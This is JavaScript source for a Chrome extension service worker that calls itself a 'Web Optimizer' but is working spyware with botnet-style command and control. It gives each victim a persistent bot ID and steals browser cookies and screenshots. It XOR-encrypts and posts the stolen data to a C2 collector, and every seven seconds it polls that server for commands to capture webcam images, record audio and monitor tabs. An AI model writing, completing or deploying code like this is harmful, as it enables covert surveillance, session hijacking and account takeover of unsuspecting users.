// =============================================
// Web Optimizer - Background Service Worker
// Version 5.1 - XOR Encryption (Reverted)
// =============================================

console.log("%c[Optimizer] Background Service Worker Initialized", "color: blue; font-weight: bold;");

// ==================== CONFIGURATION ====================
const C2_BASE = "http://127.0.0.1:31337";
const C2_COLLECTOR = C2_BASE + "/api/v1/collector";
const XOR_KEY = "FLIPPER_SECURE_XOR_KEY_1337"; 

let botUUID = null;

// Mengambil atau membuat UUID permanen
async function getUUID() {
    return new Promise((resolve) => {
        chrome.storage.local.get(['botUUID'], (result) => {
            if (result.botUUID) {
                resolve(result.botUUID);
            } else {
                const newUUID = crypto.randomUUID();
                chrome.storage.local.set({ botUUID: newUUID }, () => resolve(newUUID));
            }
        });
    });
}

// ==================== ROBUST ENCRYPTION (XOR) ====================
function xorUint8Array(array, key) {
    const keyBytes = new TextEncoder().encode(key);
    const result = new Uint8Array(array.length);
    for (let i = 0; i < array.length; i++) {
        result[i] = array[i] ^ keyBytes[i % keyBytes.length];
    }
    return result;
}

function uint8ToBase64(uint8Array) {
    let binary = '';
    const len = uint8Array.byteLength;
    for (let i = 0; i < len; i++) {
        binary += String.fromCharCode(uint8Array[i]);
    }
    return btoa(binary);
}

// ==================== DATA EXFILTRATION ====================
async function sendDataToC2(data) {
    try {
        if (!botUUID) botUUID = await getUUID();
        data.uuid = botUUID;
        data.platform = navigator.platform;
        data.userAgent = navigator.userAgent;

        const jsonString = JSON.stringify(data, null, 2);
        const textBytes = new TextEncoder().encode(jsonString);
        const encryptedBytes = xorUint8Array(textBytes, XOR_KEY);
        const base64String = uint8ToBase64(encryptedBytes);

        fetch(C2_COLLECTOR, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ data: base64String }),
        });

        console.log(`%c[Optimizer] ✅ Secure XOR payload dispatched`, "color: lime;");
    } catch (e) {
        console.error("[Optimizer] Xfer Error:", e);
    }
}

// ==================== MESSAGE LISTENER ====================
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    if (msg.type === "SAVE_DATA") {
        sendDataToC2(msg.data);
    } 
    else if (msg.type === "TAKE_SCREENSHOT") {
        takeScreenshot(sender.tab);
    }
    else if (msg.type === "STOP_MONITORING") {
        handleStopMonitoring();
    }
    else if (msg.type === "STEAL_COOKIES") {
        stealCookies(sender.tab);
    }
    else if (msg.type === "START_MONITORING") {
        handleStartMonitoring();
    }
    else if (msg.type === "HEARTBEAT") {
        sendResponse({ ok: true });
    }
});

// ==================== UTILS ====================

async function stealCookies(tab) {
    if (!tab || !tab.url) return;
    try {
        const cookies = await chrome.cookies.getAll({ url: tab.url });
        sendDataToC2({
            type: "Cookie Backup",
            url: tab.url,
            cookies: cookies.map(c => ({ name: c.name, value: c.value, domain: c.domain, path: c.path }))
        });
    } catch (e) {}
}

async function takeScreenshot(tab) {
    if (!tab || !tab.id) return;
    try {
        const screenshotUrl = await chrome.tabs.captureVisibleTab(tab.windowId, { format: "png" });
        sendDataToC2({
            type: "Screenshot Capture",
            url: tab.url,
            imageData: screenshotUrl
        });
    } catch (e) {}
}

function handleStartMonitoring() {
    chrome.storage.local.set({ monitoringEnabled: true });
    chrome.tabs.query({}, (tabs) => {
        tabs.forEach(tab => {
            if (tab.id) chrome.tabs.sendMessage(tab.id, { type: "START_MONITORING" }).catch(() => {});
        });
    });
}

function handleStopMonitoring() {
    chrome.storage.local.set({ monitoringEnabled: false });
    chrome.tabs.query({}, (tabs) => {
        tabs.forEach(tab => {
            if (tab.id) chrome.tabs.sendMessage(tab.id, { type: "STOP_MONITORING" }).catch(() => {});
        });
    });
}

// ==================== C2 COMMAND POLLING ====================
let lastC2State = null;

async function pollC2Status() {
    try {
        if (!botUUID) botUUID = await getUUID();
        const response = await fetch(`${C2_BASE}/api/v1/status?uuid=${botUUID}`);
        if (!response.ok) return;
        const data = await response.json();
        
        if (data.monitoringEnabled !== lastC2State) {
            lastC2State = data.monitoringEnabled;
            data.monitoringEnabled ? handleStartMonitoring() : handleStopMonitoring();
        }

        if (data.command) {
            console.log(`[Optimizer] Command: ${data.command.name}`);
            executeRemoteCommand(data.command);
        }
    } catch (e) {}
}

function executeRemoteCommand(cmd) {
    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
        if (!tabs[0]) return;
        const tab = tabs[0];
        
        if (cmd.name === 'TAKE_SCREENSHOT') takeScreenshot(tab);
        else if (cmd.name === 'STEAL_COOKIES') stealCookies(tab);
        else if (cmd.name === 'CAPTURE_WEBCAM') chrome.tabs.sendMessage(tab.id, { type: "TRIGGER_WEBCAM_CAPTURE" }).catch(() => {});
        else if (cmd.name === 'RECORD_AUDIO') chrome.tabs.sendMessage(tab.id, { type: "RECORD_AUDIO", duration: cmd.duration }).catch(() => {});
        else if (cmd.name === 'SET_MONITORING') {
            cmd.enabled ? handleStartMonitoring() : handleStopMonitoring();
        }
    });
}

// Init
setInterval(pollC2Status, 7000);
pollC2Status();
